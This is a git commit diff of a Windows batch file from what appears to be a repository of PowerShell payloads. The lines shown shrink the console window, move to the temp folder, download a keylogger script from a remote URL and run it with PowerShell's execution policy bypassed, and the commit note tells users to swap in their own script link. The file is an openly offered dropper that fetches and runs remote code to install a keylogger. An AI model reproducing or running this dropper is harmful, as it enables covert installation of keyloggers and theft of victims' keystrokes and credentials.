2bb19c6e88c91c628b6907c8712919dd8b2b5479
Subhranshu Choudhury <63858190+subhranshuchoudhury@users.noreply.github.com>
2022-01-07 23:56:35 +0530

    note:
    Change the file name and link according to your script.

--- 5. Send powershell as batch.bat
+++ 5. Send powershell as batch.bat
@@ -3,4 +3,3 @@ mode con:cols=30 lines=1
 cd %temp%
 Invoke-WebRequest -OutFile klogger.ps1 -Uri https://raw.githubusercontent.com/subhranshuchoudhury/Powershell_Payloads/main/3.%20Keylogger.ps1
 powershell -executionpolicy bypass -File .\klogger.ps1
-
